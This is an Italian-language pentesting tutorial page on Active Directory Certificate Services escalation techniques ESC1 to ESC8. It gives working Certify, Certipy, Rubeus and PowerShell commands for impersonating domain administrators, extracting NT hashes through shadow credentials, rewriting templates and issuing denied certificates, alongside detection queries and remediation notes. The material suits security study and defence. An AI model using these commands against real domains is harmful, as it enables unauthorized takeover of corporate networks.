# Escalation di dominio AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Questo è un riepilogo delle sezioni sulle tecniche di escalation dei post:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Template di certificato configurati in modo errato - ESC1

### Spiegazione

### Spiegazione di ESC1: template di certificato configurati in modo errato

- **L'Enterprise CA concede i diritti di enrollment a utenti con privilegi ridotti.**
- **Non è richiesta l'approvazione di un manager.**
- **Non sono necessarie firme del personale autorizzato.**
- **I descrittori di sicurezza dei template di certificato sono eccessivamente permissivi e consentono agli utenti con privilegi ridotti di ottenere diritti di enrollment.**
- **I template di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
  - Sono inclusi identificatori di Extended Key Usage (EKU) come Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) o nessuna EKU (SubCA).
- **Il template consente ai richiedenti di includere un subjectAltName nella Certificate Signing Request (CSR):**
  - Se presente, Active Directory (AD) assegna priorità al subjectAltName (SAN) di un certificato per la verifica dell'identità. Ciò significa che, specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (ad esempio, un amministratore di dominio). La possibilità per il richiedente di specificare un SAN è indicata nell'oggetto AD del template di certificato dalla proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` consente al richiedente di specificare il SAN.

> [!CAUTION]
> Queste impostazioni identificano un template candidato ESC1, non un percorso di impersonificazione completo. Verifica che il principal di destinazione possa effettuare l'enrollment su una CA che pubblica il template, che l'enrollment sulla CA sia consentito e che il certificato rilasciato soddisfi le regole di mapping SID forte dell'endpoint di autenticazione. I KDC aggiornati possono rifiutare un UPN richiesto se il SID del certificato non corrisponde a quello del target; consulta le [indicazioni di Microsoft sul mapping dei certificati](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

I diritti di enrollment concessi a **Domain Computers** possono rendere idonea un'identità computer predisposta, anche quando l'utente originale non può effettuare l'enrollment. Valuta separatamente i diritti del principal computer. Controlla `msPKI-Minimal-Key-Size` prima di inviare una richiesta: un template che richiede chiavi RSA a 4096 bit rifiuta il valore predefinito a 2048 bit del client. Un SID di destinazione fornito nella richiesta può risolvere una mancata corrispondenza dei SID solo se la CA e il KDC accettano il certificato risultante e il relativo mapping; né i flag del template né un ACE Enroll, da soli, lo dimostrano.

Questa funzionalità viene talvolta abilitata per supportare la generazione al volo di certificati HTTPS o host da parte di prodotti o servizi di deployment, oppure per mancanza di comprensione.

Si osserva che la creazione di un certificato con questa opzione attiva un avviso, a differenza di quanto avviene quando si duplica un template di certificato esistente (come il template `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato) e lo si modifica per includere un OID di autenticazione.<sup>[[6]](#references)</sup>

### Abuso

Per **individuare template di certificato vulnerabili**, puoi eseguire:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Per **sfruttare questa vulnerabilità per impersonare un amministratore**, si potrebbe eseguire:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Quindi puoi convertire il **certificato generato nel formato `.pfx`** e usarlo per **autenticarti nuovamente con Rubeus o certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

I binari Windows "Certreq.exe" e "Certutil.exe" possono essere usati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei template di certificato nello schema di configurazione della foresta AD, in particolare quelli che non richiedono approvazione o firme, che dispongono di un EKU Client Authentication o Smart Card Logon e che hanno abilitato il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, può essere eseguita eseguendo la seguente query LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Modelli di certificato configurati in modo errato - ESC2

### Spiegazione

Il secondo scenario di abuso è una variante del primo:

1. L’Enterprise CA concede diritti di enrollment a utenti con privilegi bassi.
2. Il requisito di approvazione del manager è disabilitato.
3. Il requisito di firme autorizzate è omesso.
4. Un descrittore di sicurezza troppo permissivo nel modello di certificato concede diritti di enrollment del certificato a utenti con privilegi bassi.
5. **Il modello di certificato è definito in modo da includere l’EKU Any Purpose o nessun EKU.**

L’**EKU Any Purpose** consente a un attacker di ottenere un certificato per **qualsiasi scopo**, tra cui l’autenticazione client, l’autenticazione server, la firma del codice e così via. Per sfruttare questo scenario è possibile impiegare la stessa **tecnica usata per ESC3**.

I certificati **senza EKU**, che agiscono come certificati CA subordinati, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere usati per firmare nuovi certificati**. Pertanto, un attacker potrebbe specificare EKU o campi arbitrari nei nuovi certificati utilizzando un certificato CA subordinato.

Tuttavia, i nuovi certificati creati per l’**autenticazione di dominio** non funzioneranno se la CA subordinata non è considerata attendibile dall’oggetto **`NTAuthCertificates`**, che è l’impostazione predefinita. Ciononostante, un attacker può comunque creare **nuovi certificati con qualsiasi EKU** e valori arbitrari. Questi potrebbero essere **sfruttati** per un’ampia gamma di scopi (ad es. firma del codice, autenticazione server e così via) e potrebbero avere implicazioni significative per altre applicazioni della rete, come SAML, AD FS o IPSec.<sup>[[6]](#references)</sup>

Per enumerare i modelli che corrispondono a questo scenario nello schema di configurazione dell’AD Forest, è possibile eseguire la seguente query LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Template dell'Enrollment Agent configurati in modo errato - ESC3

### Spiegazione

Questo scenario è simile al primo e al secondo, ma **abusa** di un **EKU diverso** (Certificate Request Agent) e di **2 template diversi** (quindi presenta 2 serie di requisiti).

L'**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), noto come **Enrollment Agent** nella documentazione Microsoft, consente a un principal di **richiedere** un **certificato** per conto di un altro utente.

L'**“enrollment agent”** richiede un **template** di questo tipo e usa il **certificato risultante per co-firmare una CSR per conto dell'altro utente**. Quindi **invia** la **CSR co-firmata** alla CA e richiede un certificato da un **template** che **consente la richiesta “per conto di”**. La CA risponde con un **certificato appartenente all'“altro” utente**.<sup>[[6]](#references)</sup>

**Requisiti 1:**

- L'Enterprise CA concede diritti di richiesta a utenti con privilegi limitati.
- Il requisito di approvazione del manager è omesso.
- Non è richiesta alcuna firma autorizzata.
- Il security descriptor del template del certificato è eccessivamente permissivo e concede diritti di richiesta a utenti con privilegi limitati.
- Il template del certificato include l'EKU Certificate Request Agent, consentendo di richiedere certificati da altri template per conto di altri principal.

**Requisiti 2:**

- L'Enterprise CA concede diritti di richiesta a utenti con privilegi limitati.
- L'approvazione del manager è bypassata.
- Un template di destinazione versione 1 può accettare un enrollment agent senza i più recenti controlli granulari delle issuance policy; per la versione 2 o successive, valuta i requisiti di emissione delle application policy e le firme autorizzate, anziché escludere il template basandoti solo sulla versione.
- Un EKU definito nel template del certificato consente l'autenticazione nel dominio.
- Sulla CA non sono applicate restrizioni per gli enrollment agent.

Anche il template di destinazione deve essere pubblicato dalla CA scelta, consentire all'account di destinazione di richiedere il certificato e supportare l'uso previsto per l'autenticazione nel dominio. Verifica gli attributi subject/SAN richiesti per quell'account; ad esempio, un template che ricava l'email del subject da AD non può emettere un certificato per un account senza il valore `mail` richiesto. Il solo certificato dell'agent non soddisfa questi requisiti del template di destinazione.

### Abuso

Puoi usare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per abusare di questo scenario:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Gli **utenti** autorizzati a **ottenere** un **certificato Enrollment Agent**, i modelli in cui gli **agenti** possono eseguire l'enrollment e gli **account** per conto dei quali l'agente può agire possono essere limitati dalle CA aziendali. Per farlo, apri lo **snap-in** `certsrc.msc`, fai **clic destro sulla CA**, fai clic su **Proprietà** e vai alla scheda “Enrollment Agents”.

Tuttavia, l'impostazione **predefinita** delle CA è “**Non limitare gli agenti di enrollment**”. Quando gli amministratori abilitano le restrizioni sugli agenti di enrollment impostando “Limita gli agenti di enrollment”, la configurazione predefinita rimane estremamente permissiva. Consente a **Everyone** di eseguire l'enrollment in tutti i modelli come chiunque.

### PoC PowerShell solo per Windows con Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) esegue ESC1 ed ESC2/ESC3 senza Certify o Certipy. I suoi script creano una chiave RSA da 2048 bit esportabile tramite l'API COM `X509Enrollment`, generano una richiesta PKCS#10, individuano tramite LDAP il primo `pKIEnrollmentService`, la inviano tramite `CertificateAuthority.Request`, installano la risposta in `Cert:\CurrentUser\My` ed esportano un PFX codificato in Base64. Lo script ESC1 aggiunge un SAN UPN scelto dall'attaccante (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valore `0xb`), mentre gli script ESC2/ESC3 usano il primo certificato per firmare una richiesta PKCS#7 per conto terzi.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Gli script stampano il Base64 del **PFX**, che include la chiave privata, per l'uso diretto con Rubeus. Non sostituirlo con `[Convert]::ToBase64String($cert.RawData)`: `RawData` codifica solo il certificato pubblico e non può firmare la richiesta PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Controllo di accesso vulnerabile ai certificate template - ESC4

### **Spiegazione**

Il **security descriptor** sui **certificate template** definisce le **autorizzazioni** di cui dispongono specifici **principal AD** sul template.

Se un **attaccante** dispone delle **autorizzazioni** necessarie per **modificare** un **template** e **introdurre** una qualsiasi delle **configurazioni errate sfruttabili** descritte nelle **sezioni precedenti**, può ottenere un'escalation dei privilegi.

Tra le autorizzazioni degne di nota applicabili ai certificate template figurano:<sup>[[6]](#references)</sup>

- **Owner:** Concede il controllo implicito sull'oggetto, consentendo di modificare qualsiasi attributo.
- **FullControl:** Concede autorità completa sull'oggetto, inclusa la possibilità di modificarne qualsiasi attributo.
- **WriteOwner:** Consente di modificare il proprietario dell'oggetto assegnandolo a un principal sotto il controllo dell'attaccante.
- **WriteDacl:** Consente di modificare i controlli di accesso, con la possibilità di concedere all'attaccante FullControl.
- **WriteProperty:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

Esamina anche la DACL del container `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Un ACE `CreateChild` applicabile e limitato alla classe [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), o un controllo completo esteso, può consentire la creazione di un nuovo oggetto template. [La documentazione Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) specifica che il container contiene questi oggetti template. Prima di stabilire se la creazione sia effettivamente possibile, esamina gli ACE deny corrispondenti e l'ereditarietà. La creazione di un template non comporta di per sé l'emissione di un certificato: una CA deve pubblicarlo, il principal richiedente deve avere i permessi di enrollment e il certificato deve essere mappato all'identità prevista dall'endpoint di autenticazione.

### Abuso

Per individuare i principal con diritti di modifica sui template e su altri oggetti PKI, esegui l'enumerazione con Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Un esempio di privesc come quello precedente:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 si verifica quando un utente dispone di privilegi di scrittura su un certificate template. Questo può, ad esempio, essere sfruttato per sovrascrivere la configurazione del certificate template e renderlo vulnerabile a ESC1.

Un template che consente già all’enrollee di specificare il subject, ma prevede solo l’uso Server Authentication, non è di per sé un template per l’accesso utente. Con diritti effettivi di controllo sul template, un attaccante potrebbe modificarne gli EKU di autenticazione o le application policy prima di richiedere un certificato; [Microsoft documenta la finalità di accesso dell’EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Verifica che una CA pubblichi il template modificato, che il richiedente possa effettuare l’enrollment, che i requisiti di approvazione/firma siano soddisfatti e che il certificato emesso venga associato all’account previsto. In particolare, [i domain controller aggiornati con Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) rifiutano i certificati senza strong mapping; aggiungere un UPN target alla richiesta non aggira questo requisito.

Come possiamo vedere nel percorso qui sopra, solo `JOHNPC` dispone di questi privilegi, ma il nostro utente `JOHN` ha il nuovo edge `AddKeyCredentialLink` verso `JOHNPC`. Poiché questa tecnica è correlata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ecco una breve anteprima del comando `shadow auto` di Certipy per recuperare l’hash NT della vittima.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** può sovrascrivere la configurazione di un modello di certificato con un singolo comando. Per **impostazione predefinita**, Certipy **sovrascriverà** la configurazione rendendola **vulnerabile a ESC1**. Possiamo anche specificare il parametro **`-save-old` per salvare la vecchia configurazione**, utile per **ripristinarla** dopo il nostro attacco.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Controllo di accesso vulnerabile agli oggetti PKI - ESC5

### Spiegazione

L’ampia rete di relazioni interconnesse basate su ACL, che comprende diversi oggetti oltre ai certificate template e alla Certification Authority, può compromettere la sicurezza dell’intero sistema AD CS. Tra gli oggetti che possono influire significativamente sulla sicurezza rientrano:

- L’oggetto computer AD del server CA, che può essere compromesso tramite meccanismi come S4U2Self o S4U2Proxy.
- Il server RPC/DCOM del server CA.
- Qualsiasi oggetto AD discendente o contenitore nel percorso specifico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Questo percorso include, a titolo esemplificativo, contenitori e oggetti come il contenitore Certificate Templates, il contenitore Certification Authorities, l’oggetto NTAuthCertificates e il contenitore Enrollment Services.

La sicurezza del sistema PKI può essere compromessa se un aggressore con privilegi limitati riesce a prendere il controllo di uno qualsiasi di questi componenti critici.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

L’argomento trattato nel [**post di CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) esamina anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come descritto da Microsoft. Se attivata su una Certification Authority (CA), questa configurazione consente di includere **valori definiti dall’utente** nel **subject alternative name** di **qualsiasi richiesta**, comprese quelle create da Active Directory®. Di conseguenza, un **intruso** può effettuare l’enrollment tramite **qualsiasi template** configurato per l’**autenticazione** nel dominio, in particolare quelli che consentono l’enrollment da parte di utenti **non privilegiati**, come il template User predefinito. In questo modo, è possibile ottenere un certificato che consente all’intruso di autenticarsi come amministratore di dominio o come **qualsiasi altra entità attiva** nel dominio.<sup>[[9]](#references)</sup>

**Nota**: Il metodo per aggiungere **nomi alternativi** a una Certificate Signing Request (CSR) tramite l’argomento `-attrib "SAN:"` in `certreq.exe` (indicato come “Name Value Pairs”) è **diverso** dalla strategia di exploit dei SAN in ESC1. La differenza sta nel **modo in cui vengono incapsulate le informazioni dell’account**: in questo caso sono contenute in un attributo del certificato, anziché in un’estensione.

### Abuso

Per verificare se l’impostazione è attiva, le organizzazioni possono usare il seguente comando con `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Questa operazione utilizza essenzialmente l'**accesso remoto al registro**, quindi un approccio alternativo potrebbe essere:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa configurazione errata e sfruttarla:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Per modificare queste impostazioni, supponendo di disporre di **privilegi di amministratore del dominio** o equivalenti, è possibile eseguire il seguente comando da qualsiasi workstation:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Dopo gli aggiornamenti di sicurezza di maggio 2022, i nuovi **certificati** emessi conterranno un'**estensione di sicurezza** che incorpora la proprietà `objectSid` del **richiedente**. Per ESC1, questo SID deriva dal SAN specificato. Tuttavia, per **ESC6**, il SID rispecchia `objectSid` del **richiedente**, non il SAN.\
> Per sfruttare ESC6, è essenziale che il sistema sia vulnerabile a ESC10 (Weak Certificate Mappings), che assegna priorità al **SAN rispetto alla nuova estensione di sicurezza**.

## Controllo degli accessi vulnerabile dell'autorità di certificazione - ESC7

### Attacco 1

#### Spiegazione

Il controllo degli accessi per un'autorità di certificazione è gestito tramite un insieme di autorizzazioni che regolano le azioni della CA. È possibile visualizzare queste autorizzazioni accedendo a `certsrv.msc`, facendo clic con il pulsante destro del mouse su una CA, selezionando le proprietà e passando alla scheda Sicurezza. Inoltre, è possibile enumerare le autorizzazioni usando il modulo PSPKI con comandi come:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Questo fornisce informazioni sui privilegi principali, ovvero **`ManageCA`** e **`ManageCertificates`**, corrispondenti rispettivamente ai ruoli di “amministratore della CA” e “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Abuse

I privilegi **`ManageCA`** su un’autorità di certificazione consentono al principal di modificare le impostazioni da remoto usando PSPKI. Ciò include l’attivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire di specificare il SAN in qualsiasi template, un aspetto fondamentale per la domain escalation.

È possibile semplificare questo processo usando il cmdlet **Enable-PolicyModuleFlag** di PSPKI, che consente di apportare modifiche senza interagire direttamente con la GUI.

I privilegi **`ManageCertificates`** consentono di approvare le richieste in sospeso, aggirando di fatto la protezione “approvazione del CA certificate manager”.

È possibile utilizzare una combinazione dei moduli **Certify** e **PSPKI** per richiedere, approvare e scaricare un certificato:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attacco 2

#### Spiegazione

> [!WARNING]
> Nel **precedente attacco** sono stati usati i permessi **`Manage CA`** per **abilitare** il flag **EDITF_ATTRIBUTESUBJECTALTNAME2** ed eseguire l'attacco **ESC6**, ma ciò non avrà effetto finché il servizio CA (`CertSvc`) non verrà riavviato. Quando un utente dispone del diritto di accesso `Manage CA`, può anche **riavviare il servizio**. Tuttavia, questo **non significa che possa riavviare il servizio da remoto**. Inoltre, **ESC6 potrebbe non funzionare immediatamente** nella maggior parte degli ambienti aggiornati, a causa degli aggiornamenti di sicurezza di maggio 2022.

Pertanto, viene presentato un altro attacco.

Prerequisiti:

- Solo il permesso **`ManageCA`**
- Il permesso **`Manage Certificates`** (può essere concesso da **`ManageCA`**)
- Il template di certificato **`SubCA`** deve essere **abilitato** (può essere abilitato da **`ManageCA`**)

La tecnica si basa sul fatto che gli utenti con i diritti di accesso `Manage CA` _e_ `Manage Certificates` possono **approvare richieste di certificato non riuscite**. Il template di certificato **`SubCA`** è **vulnerabile a ESC1**, ma **solo gli amministratori** possono iscriversi al template. Pertanto, un **utente** può **richiedere** di iscriversi a **`SubCA`** — richiesta che verrà **negata** — ma che **in seguito verrà approvata dal responsabile**.<sup>[[6]](#references)</sup>

#### Abuso

Puoi **concederti il diritto di accesso `Manage Certificates`** aggiungendo il tuo utente come nuovo responsabile.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Il template **`SubCA`** può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il template `SubCA` è abilitato.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul template `SubCA`**.

**La richiesta verrà rifiutata**, ma salveremo la chiave privata e annoteremo l'ID della richiesta.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Con **`Manage CA` e `Manage Certificates`**, possiamo quindi **emettere il certificato della richiesta non riuscita** con il comando `ca` e il parametro `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

E infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Abuso dell’estensione Manage Certificates (SetExtension)

#### Spiegazione

Oltre ai classici abusi ESC7 (abilitare gli attributi EDITF o approvare richieste in sospeso), **Certify 2.0** ha rivelato una primitiva completamente nuova che richiede solo il ruolo *Manage Certificates* (ovvero **Certificate Manager / Officer**) sulla Enterprise CA.<sup>[[3]](#references)</sup>

Il metodo RPC `ICertAdmin::SetExtension` può essere eseguito da qualsiasi principal che disponga di *Manage Certificates*. Sebbene questo metodo fosse tradizionalmente usato dalle CA legittime per aggiornare le estensioni delle richieste **in sospeso**, un attacker può abusarne per **aggiungere un’estensione del certificato *non predefinita*** (ad esempio un OID *Certificate Issuance Policy* personalizzato come `1.1.1.1`) a una richiesta in attesa di approvazione.

Poiché il template preso di mira **non definisce un valore predefinito per quell’estensione**, la CA NON sovrascriverà il valore controllato dall’attacker quando la richiesta verrà infine emessa. Il certificato risultante conterrà quindi un’estensione scelta dall’attacker che può:

* Soddisfare i requisiti di Application / Issuance Policy di altri template vulnerabili (causando privilege escalation).
* Inserire EKU o policy aggiuntivi che conferiscono al certificato una fiducia inattesa in sistemi di terze parti.

In breve, *Manage Certificates* – in precedenza considerata la metà “meno potente” di ESC7 – può ora essere sfruttata per ottenere una privilege escalation completa o una persistenza a lungo termine, senza modificare la configurazione della CA e senza richiedere il diritto più restrittivo *Manage CA*.

#### Sfruttare la primitiva con Certify 2.0

1. **Inviare una richiesta di certificato che rimanga *in sospeso*.** Questo risultato può essere forzato usando un template che richiede l’approvazione del manager:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Aggiungi un'estensione personalizzata alla richiesta in sospeso** usando il nuovo comando `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Se il modello non definisce già l’estensione *Certificate Issuance Policies*, il valore precedente verrà mantenuto dopo l’emissione.*

3. **Invia la richiesta** (se il tuo ruolo dispone anche dei diritti di approvazione *Manage Certificates*) oppure attendi che un operatore la approvi. Una volta emesso, scarica il certificato:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Il certificato risultante ora contiene l’OID della issuance policy malevola e può essere usato in attacchi successivi (ad es. ESC13, escalation di dominio, ecc.).

> NOTA: Lo stesso attacco può essere eseguito con Certipy ≥ 4.7 tramite il comando `ca` e il parametro `-set-extension`.

## NTLM Relay verso gli endpoint HTTP di AD CS – ESC8

### Spiegazione

> [!TIP]
> Negli ambienti in cui **AD CS è installato**, se esiste un **endpoint web enrollment vulnerabile** e almeno un **certificate template pubblicato** consente **l’enrollment dei computer di dominio e l’autenticazione client** (come il template predefinito **`Machine`**), un attaccante può compromettere **qualsiasi computer con il servizio spooler attivo**!

AD CS supporta diversi **metodi di enrollment basati su HTTP**, disponibili tramite ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per l’enrollment di certificati via HTTP sono vulnerabili agli **attacchi NTLM relay**. Da una **macchina compromessa, un attaccante può impersonare qualsiasi account AD che esegua l’autenticazione tramite NTLM in ingresso**. Impersonando l’account della vittima, un attaccante può accedere a queste interfacce web per **richiedere un certificato di autenticazione client usando i certificate template `User` o `Machine`**.

